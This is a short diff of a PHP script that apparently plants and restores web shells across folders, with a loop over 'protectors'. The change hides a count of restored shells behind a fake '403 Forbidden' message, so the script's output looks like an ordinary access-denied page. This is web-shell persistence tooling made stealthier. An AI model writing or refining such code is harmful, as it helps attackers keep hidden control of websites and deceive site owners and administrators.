@@ -60,7 +60,7 @@ foreach ($spread_locations as $folder) {
     }
 }
 
-echo "<pre> 403 Forbidden You don't have permission to access this resource. $restored_count shell</pre>";
+echo "<pre> 403 Forbidden You don't have permission to access this resource.</pre>";
 
 
 foreach ($protectors as $p) {
